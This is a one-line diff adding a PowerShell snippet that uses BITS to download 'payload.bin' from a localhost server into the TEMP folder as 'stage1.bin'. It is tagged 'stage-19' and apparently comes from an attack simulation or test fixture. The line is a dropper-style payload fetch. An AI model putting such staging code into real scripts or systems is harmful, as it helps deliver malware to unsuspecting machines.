@@ -1,0 +1,1 @@
+<# Remote fetch #> try { $DownloadUrl = "http://localhost:8000/downloads/payload.bin"; $DropPath = "$env:TEMP\stage1.bin"; Start-BitsTransfer -Source $DownloadUrl -Destination $DropPath; $StageMarker = "stage-19" } catch { Write-Warning "Remote fetch failed" }
